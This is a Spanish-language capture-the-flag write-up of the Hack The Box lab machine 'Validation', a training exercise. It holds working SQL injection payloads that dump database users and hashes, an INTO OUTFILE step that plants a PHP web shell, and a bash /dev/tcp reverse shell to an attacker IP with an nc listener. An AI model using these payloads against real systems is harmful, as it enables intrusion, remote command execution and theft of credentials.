# Validation

<p align="center">
  <img src="https://www.hackthebox.com/storage/avatars/e2e239f39430cf597202497d910b82b8.png">
</p>

<div align="center">
  <table>
    <tr>
      <th>Plataforma</th>
      <th>Nombre</th>
      <th>OS</th>
      <th>IP</th>
      <th>Fecha de la máquina retirada</th>
      <th>Dificultad</th>
      <th>Certificaciones</th>
      <th>Status</th>
    </tr>
    <tr>
      <td>Hack The Box</td>
      <td>Validation</td>
      <td>Linux</td>
      <td>10.10.11.116</td>
      <td>13 de Septiembre 2021</td>
      <td>:green_circle: Fácil</td>
      <td>
        <ul>
          <li>eJPT</li>
          <li>eWPT</li>
        </ul>
      </td>
      <td>:heavy_check_mark:</td>
    </tr>
  </table>
</div>

> -------------------------

## Etapa

- [Etapa de Reconocimiento](#etapa-de-reconocimiento)
- [Etapa de Enumeración](#etapa-de-enumeración)
- [Etapa de Explotación](#etapa-de-explotación)
- [Escalada de Privilegios](#escalada-de-privilegios)

> -------------------------

## Técnicas Exploradas

- SQLI (**Error Based**)
- SQLI **>** RCE (**INTO OUTFILE**)
- Information Leakage

> -------------------------

#### Etapa de Reconocimiento

<p align="justify">
  Para empezar, iniciamos un escaneo agresivo para la enumeración de puerto abierto y descubrimos la siguiente información de puertos, lo cual no es recomendable, se debe aplicar escaneos sigiloso.
</p>

```python
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP> -oG allPorts
nmap -sCV -p<PORTS> <IP> -oN targeted
```
|Item|Descripción|
|---|---|
|-p-|Un atajo que le dice a Nmap que escanee todos los puertos|
|-vvv|Brinda una salida muy detallada para que pueda ver los resultados a medida que se encuentran, y también incluye información que normalmente no se muestra|
|-sC|Equivale --script=default ejecuta una colección de scripts de enumeración Nmap contra el objetivo|
|-sV|¿Escanea una versión de servicio?|
|-oA|Guarda los tres formatos (estándar, greppable y XML) de salida con un nombre de archivo de $name|

```php

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8f5efd2d3f98dadc6cf24859426ef7a (RSA)
|   256 463d6bcba819eb6ad06886948673e172 (ECDSA)
|_  256 7032d7e377c14acf472adee5087af87a (ED25519)
80/tcp   open  http    Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site does not have a title (text/html; charset=UTF-8).
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: 502 Bad Gateway

```
> **ID - BUSQUEDA DE VERSIÓN**

<p align="justify">
  Podemos identificar la máquina, por medio del **CODENAME** de las versiones de los servicios expuestos.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/f135fe20-bc64-4ff2-b40d-6ec512378f68">
</p>

> -------------------------

#### Etapa de Enumeración

<p align="justify">
  Trataremos de utilizar HTTP. Comprobar el puerto 80 para ver si surge algo interesante. Debido a que el Apache Server está expuesto en el puerto 80, podemos verificarlo inmediatamente en el navegador.
</p>

> **SERVICIO HTTP - PORT 80**

Para visualizar las tecnologías que emplea el servidor web, podemos aplicar un <mark style="background: #ABF7F7A6;">**WHATWEB**</mark>.

```go
whatweb http://10.10.11.116/
```

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0de4acb9-95e3-4e61-9b79-673adcd8ee9e">
</p>

<p align="justify">
  La experiencia se vuelve más entretenida cuando registro el mismo nombre en un país diferente, pero quiero aclarar que en ningún caso intento aprovechar ninguna situación. Para evitar complicaciones innecesarias, prefiero crear un nuevo nombre de usuario cada vez que realizo un registro.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/5d5d341b-26d8-4bf1-90f3-e759edc8e934">
</p>

<p align="justify">
  Tenemos un campo de entrada para el nombre de usuario. Vamos a poner a prueba este campo al ingresar un nombre y seleccionar un país. Luego, agregaremos otro usuario y analizaremos la solicitud en Burp Suite. Como puedes observar, se están enviando dos parámetros al servidor mediante una solicitud POST: el nombre de usuario y el país. Vamos a reenviar la solicitud para examinar la respuesta del servidor.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0eeb0ec7-2528-48cb-b515-2db09dc412df">
</p>

<p align="justify">
  El servidor emite un encabezado Set-Cookie que contiene un parámetro denominado "usuario". Si inspeccionas el valor de este parámetro, notarás que se trata de una cadena MD5 generada a partir de tu nombre de usuario.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/3b1fd86d-07c3-488e-aaae-2713cbc9ffba">
</p>

>**PRUEBAS DE SQL INJECTION**

<p align="justify">
Dado todo lo mencionado anteriormente, procederemos a iniciar las pruebas de ataques de Inyección SQL (SQLi). Verificaremos si es posible vulnerar la consulta SQL mediante la inserción de comillas simples o comillas dobles.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1c989816-0340-4621-aaf0-e87d9394ec30">
</p>

<p align="justify">
Realizamos una prueba al añadir una comilla simple al campo de país y enviar la solicitud, pero no se observa ninguna indicación de un error SQL en la respuesta inicial. Sin embargo, al regresar al navegador y actualizar la página, se muestra un mensaje de error en el código. Para obtener más detalles, procedamos a examinar el código fuente de la página.
</p>

<div align="center">
  <table>
    <tr>
      <th>Sintaxis</th>
      <th>Descripción</th>
    </tr>
    <tr>
      <td>campo'</td>
      <td>Ocasionar un ERROR</td>
    </tr>
    <tr>
      <td>campo' order by 100-- -</td>
      <td>Validar las columnas que emplea la base de datos</td>
    </tr>
    <tr>
      <td>campo' union select 1-- -</td>
      <td>Número de base de datos</td>
    </tr>
    <td>campo' union select version()-- -</td>
      <td>Enumerar la versión de la base de datos</td>
    </tr>
    <td>campo' union select database()-- -</td>
      <td>Enumerar el nombre de la base de datos actual</td>
    </tr>
  </table>
</div>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/5fe391db-78dc-4a24-af87-091ae0c63182">
</p>

> -------------------------

#### Etapa de Explotación

<p align="justify">
En este punto, podemos confirmar la presencia de una vulnerabilidad de Inyección SQL. Luego de la exfiltración de datos podemos observar que tenemos usuarios y hashes, lo cual hemos registrado, asi que es innecesario crackearlos o hacer algo con ellos. Lo que se puede probar es subir archivos mediante el campo vulnerable.
</p>

<div align="center">
  <table>
    <tr>
      <th>Sintaxis</th>
      <th>Descripción</th>
    </tr>
    <tr>
      <td>campo' union select schema_name from information_schema.schemata-- -</td>
      <td>Listar nombres de las base de datos</td>
    </tr>
    <tr>
      <td>campo' union select table_name from information_schema.tables where table_name="DB"-- -</td>
      <td>Listar tablas de una base de datos</td>
    </tr>
    <td>campo' union select column_name from information_schema.columns where table_name="DB" and table_name='table'-- -</td>
      <td>Listar columnas de una tabla</td>
    </tr>
    <tr>
      <td>campo' union select group_concat(username,0x3a,userhash) from registration-- -</td>
      <td>Agrupar información de las columnas para extraer informacion (Username & userhash)</td>
    </tr>
  </table>
</div>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/fd8e66d2-5a12-49ae-a9f4-4cc5dab73c93">
</p>

> **SQL INJECTION + RCE**

<p align="justify">
Es importante destacar que la información que estamos viendo pertenece a los usuarios que hemos probado hasta ahora, por lo que no podemos considerarla como información de usuarios privilegiados en este momento.

Aunque podemos realizar algunas consultas en la base de datos, debemos tener en cuenta que también podríamos insertar contenido en una ubicación específica a través de una Inyección SQL. Supongamos que el archivo "account.php" se encuentra en la siguiente ruta:
- **/var/www/html/**
</p>

```sql
union select "Data" into outfile "/var/www/html/prueba.txt"-- -
```
<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/1a35d8cc-aa6c-4f60-b916-1abb592260ac">
</p>

<p align="justify">
Ahora que hemos confirmado que podemos cargar archivos mediante una Inyección SQL, nuestro objetivo es depositar un archivo PHP, ya que el servidor puede interpretar este tipo de archivos.

Este archivo PHP nos permitirá enviar comandos a través de una variable llamada "**cmd**":
</p>

```php
union select "<?php system($_REQUEST['cmd']); ?>" into outfile "/var/www/html/file.php"-- -
```

<p align="justify">
Ahora que hemos logrado una ejecución remota de comandos, podemos establecer una conexión inversa utilizando el siguiente recurso para obtener acceso a la máquina víctima.
</p>

- [Reverse Shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```sql
& = %26

?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.2/443 0>%261"

## Modo escucha - VM Atacante
nc -nvlp 443

```

<p align="justify">
Como se puede observar, hemos obtenido una Shell interactiva que nos permite navegar y buscar las banderas que necesitamos. 
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/0c3ed1c8-c9e9-4cf5-be06-6153e5f4dfcf">
</p>

> -------------------------

#### Escalada de Privilegios

<p align="justify">
  En la fase anterior, durante la enumeración de directorios, recordemos que encontramos un archivo llamado <mark style="background: #ADCCFFA6;">**config.php**.</mark> Sin embargo, no pudimos acceder a su contenido a través del navegador. Ahora que tenemos acceso a la máquina objetivo, vamos a intentar listar su contenido.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/48ab4128-8345-42dd-a714-90ffa55ecc72">
</p>

<p align="justify">
Al explorar su contenido, podemos identificar un usuario y una contraseña que podríamos emplear para elevar nuestros privilegios.
</p>

<p align="center">
  <img src="https://github.com/Sh4dowCost/HTB-Write-Ups/assets/90486643/21c0084b-a804-49ab-8318-26dd231a4de0">
</p>

<p align="justify">
La credencial es válida y ya estamos como usuario <mark style="background: #FF5582A6;">root</mark>.
</p>

>**VALIDATION - PWNED!**
